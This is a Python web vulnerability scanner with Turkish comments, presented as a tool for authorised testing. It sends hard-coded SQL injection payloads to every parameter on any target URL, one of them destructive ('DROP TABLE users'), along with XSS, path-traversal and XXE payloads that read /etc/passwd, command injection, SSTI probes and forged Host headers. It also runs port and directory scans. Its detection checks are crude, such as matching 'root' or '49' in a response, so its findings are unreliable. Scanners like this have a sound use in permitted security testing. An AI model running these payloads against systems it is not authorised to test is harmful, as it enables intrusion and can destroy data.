#!/usr/bin/env python3
"""
WEB GUVENLIK TARAYICI - Yetkili Testler Icin
Kullanım: python3 scanner.py hedef.com
"""

import requests
import sys
import re
import time
import socket
import ssl
import urllib.parse
from urllib.parse import urlparse, urljoin
import json
import hashlib
from datetime import datetime

class WebScanner:
    def __init__(self, target):
        if not target.startswith(('http://','https://')):
            target = 'http://' + target
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.timeout = 10
        self.results = {
            'target': target,
            'timestamp': str(datetime.now()),
            'vulnerabilities': [],
            'info': []
        }
        self.payloads = self.load_payloads()
        
    def load_payloads(self):
        return {
            'sql': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' AND SLEEP(5)--",
                "'; DROP TABLE users--",
                "' OR 1=1;--",
                "1' AND '1'='1",
                "1' AND '1'='2",
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert('XSS')",
                "'><script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "<svg/onload=alert(1)>",
                "onerror=alert(1) src=x",
            ],
            'lfi': [
                "../../../../etc/passwd",
                "../../../etc/passwd",
                "../../../../windows/win.ini",
                "../../../../boot.ini",
                "....//....//....//etc/passwd",
                "../../../../../../../../etc/passwd",
            ],
            'cmd': [
                "; ls -la",
                "| whoami",
                "&& dir",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
            ],
            'ssti': [
                "{{7*7}}",
                "${7*7}",
                "{{config}}",
                "{{self.__class__.__mro__[1].__subclasses__()}}",
                "{$smarty.version}",
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            ]
        }
    
    def get_params(self):
        """Sayfadaki tüm parametreleri bul"""
        params = set()
        try:
            r = self.session.get(self.target)
            # URL'den
            parsed = urlparse(self.target)
            if parsed.query:
                for p in parsed.query.split('&'):
                    if '=' in p:
                        params.add(p.split('=')[0])
            
            # Form'lardan
            import re
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', r.text, re.I)
            params.update(inputs)
            
            # Textarea
            textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>', r.text, re.I)
            params.update(textareas)
            
            # Select
            selects = re.findall(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>', r.text, re.I)
            params.update(selects)
            
        except:
            pass
        
        return list(params) if params else ['id', 'page', 'file', 'q', 'user', 'pass', 'search', 'cat']
    
    def test_sql(self, url, param):
        """SQL Enjeksiyon testi"""
        for payload in self.payloads['sql']:
            test_url = f"{url}?{param}={payload}"
            try:
                start = time.time()
                r = self.session.get(test_url, timeout=10)
                elapsed = time.time() - start
                
                # Hata mesajı kontrolü
                errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'ora-', 'microsoft ole db', 'driver', 'syntax error']
                if any(e in r.text.lower() for e in errors):
                    self.results['vulnerabilities'].append({
                        'type': 'SQL Injection',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'HIGH'
                    })
                    return
                
                # Zaman bazlı
                if elapsed > 4:
                    self.results['vulnerabilities'].append({
                        'type': 'SQL Injection (Time Based)',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'HIGH'
                    })
                    return
            except:
                pass
    
    def test_xss(self, url, param):
        """XSS testi"""
        for payload in self.payloads['xss']:
            test_url = f"{url}?{param}={payload}"
            try:
                r = self.session.get(test_url, timeout=10)
                if payload in r.text or payload.lower() in r.text.lower():
                    self.results['vulnerabilities'].append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'HIGH'
                    })
                    return
            except:
                pass
    
    def test_lfi(self, url, param):
        """LFI testi"""
        for payload in self.payloads['lfi']:
            test_url = f"{url}?{param}={payload}"
            try:
                r = self.session.get(test_url, timeout=10)
                if 'root:' in r.text or '[extensions]' in r.text or 'boot loader' in r.text:
                    self.results['vulnerabilities'].append({
                        'type': 'Local File Inclusion (LFI)',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'HIGH'
                    })
                    return
            except:
                pass
    
    def test_cmd(self, url, param):
        """Command Injection testi"""
        for payload in self.payloads['cmd']:
            test_url = f"{url}?{param}={payload}"
            try:
                r = self.session.get(test_url, timeout=10)
                if 'uid=' in r.text or 'root' in r.text or 'Administrator' in r.text:
                    self.results['vulnerabilities'].append({
                        'type': 'Command Injection',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'CRITICAL'
                    })
                    return
            except:
                pass
    
    def test_ssti(self, url, param):
        """SSTI testi"""
        for payload in self.payloads['ssti']:
            test_url = f"{url}?{param}={payload}"
            try:
                r = self.session.get(test_url, timeout=10)
                if '49' in r.text or 'config' in r.text or 'smarty' in r.text:
                    self.results['vulnerabilities'].append({
                        'type': 'Server-Side Template Injection (SSTI)',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'CRITICAL'
                    })
                    return
            except:
                pass
    
    def test_headers(self):
        """Header zafiyetleri"""
        # Test header injection
        test_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'Host': 'evil.com',
            'Referer': 'http://evil.com',
            'User-Agent': '<script>alert(1)</script>'
        }
        
        for key, value in test_headers.items():
            try:
                self.session.headers[key] = value
                r = self.session.get(self.target)
                if value in r.text:
                    self.results['vulnerabilities'].append({
                        'type': 'Header Injection',
                        'header': key,
                        'value': value,
                        'severity': 'MEDIUM'
                    })
            except:
                pass
        
        # Reset headers
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def test_ssl(self):
        """SSL kontrol"""
        try:
            hostname = urlparse(self.target).hostname
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    if cert:
                        self.results['info'].append({
                            'type': 'SSL Certificate',
                            'info': f"Subject: {cert.get('subject')}"
                        })
        except:
            self.results['info'].append({
                'type': 'SSL',
                'info': 'SSL baglantisi basarisiz veya yok'
            })
    
    def test_open_ports(self):
        """Port tarama"""
        hostname = urlparse(self.target).hostname
        common_ports = [80, 443, 22, 21, 25, 3306, 8080, 8443, 53, 110, 143, 993, 995]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((hostname, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        if open_ports:
            self.results['info'].append({
                'type': 'Open Ports',
                'info': f"Acilik portlar: {open_ports}"
            })
    
    def test_directory(self):
        """Dizin keşfi"""
        dirs = ['admin', 'login', 'panel', 'backup', 'tmp', 'test', 'dev', 'api', 'docs', 'uploads']
        found = []
        
        for d in dirs:
            test_url = urljoin(self.target, f"/{d}/")
            try:
                r = self.session.get(test_url, timeout=5)
                if r.status_code != 404:
                    found.append(test_url)
            except:
                pass
        
        if found:
            self.results['info'].append({
                'type': 'Found Directories',
                'info': f"Bulunan dizinler: {found}"
            })
    
    def test_robots(self):
        """robots.txt kontrol"""
        try:
            r = self.session.get(urljoin(self.target, '/robots.txt'), timeout=5)
            if r.status_code == 200:
                self.results['info'].append({
                    'type': 'robots.txt',
                    'info': f"robots.txt bulundu:\n{r.text[:500]}"
                })
        except:
            pass
    
    def test_backup_files(self):
        """Backup dosyası kontrolü"""
        backups = ['.bak', '.backup', '.old', '.swp', '~', '.txt', '.zip', '.tar.gz']
        for ext in backups:
            test_url = self.target + ext
            try:
                r = self.session.get(test_url, timeout=3)
                if r.status_code == 200 and len(r.text) > 100:
                    self.results['vulnerabilities'].append({
                        'type': 'Backup File Exposure',
                        'url': test_url,
                        'severity': 'MEDIUM'
                    })
            except:
                pass
    
    def scan(self):
        """ANA TARAMA"""
        print(f"\n{'='*60}")
        print(f"[+] Hedef: {self.target}")
        print(f"[+] Zaman: {datetime.now()}")
        print(f"{'='*60}\n")
        
        # Parametreleri bul
        params = self.get_params()
        print(f"[*] {len(params)} parametre bulundu: {params}\n")
        
        # Her parametre için test
        for param in params:
            print(f"[*] Parametre test ediliyor: {param}")
            
            # SQL
            print(f"  - SQL Enjeksiyon...")
            self.test_sql(self.target, param)
            
            # XSS
            print(f"  - XSS...")
            self.test_xss(self.target, param)
            
            # LFI
            print(f"  - LFI...")
            self.test_lfi(self.target, param)
            
            # CMD
            print(f"  - Command Injection...")
            self.test_cmd(self.target, param)
            
            # SSTI
            print(f"  - SSTI...")
            self.test_ssti(self.target, param)
        
        # Diğer testler
        print("\n[*] Header testi...")
        self.test_headers()
        
        print("[*] SSL testi...")
        self.test_ssl()
        
        print("[*] Port taramasi...")
        self.test_open_ports()
        
        print("[*] Dizin keşfi...")
        self.test_directory()
        
        print("[*] robots.txt kontrolu...")
        self.test_robots()
        
        print("[*] Backup dosyalari...")
        self.test_backup_files()
        
        # Rapor
        self.print_report()
        
    def print_report(self):
        """Rapor yazdır"""
        print(f"\n{'='*60}")
        print("[+] TARAMA TAMAMLANDI")
        print(f"{'='*60}\n")
        
        vulns = self.results['vulnerabilities']
        info = self.results['info']
        
        if vulns:
            print(f"[!] {len(vulns)} ZAFIYET BULUNDU:\n")
            for v in vulns:
                print(f"  🔴 [{v.get('severity','UNKNOWN')}] {v.get('type')}")
                print(f"     URL: {v.get('url', '')}")
                if 'payload' in v:
                    print(f"     Payload: {v.get('payload')}")
                print()
        else:
            print("[+] Zafiyet bulunamadi (temel tarama)\n")
        
        if info:
            print("[i] BILGILER:\n")
            for i in info:
                print(f"  • {i.get('type')}: {i.get('info')}")
            print()
        
        # JSON rapor kaydet
        filename = f"scan_{hashlib.md5(self.target.encode()).hexdigest()[:8]}.json"
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"[+] Rapor kaydedildi: {filename}")
        print(f"{'='*60}\n")

def main():
    if len(sys.argv) < 2:
        print("Kullanım: python3 scanner.py <hedef_url>")
        print("Örnek: python3 scanner.py http://example.com")
        print("Örnek: python3 scanner.py example.com")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = WebScanner(target)
    scanner.scan()

if __name__ == "__main__":
    main()
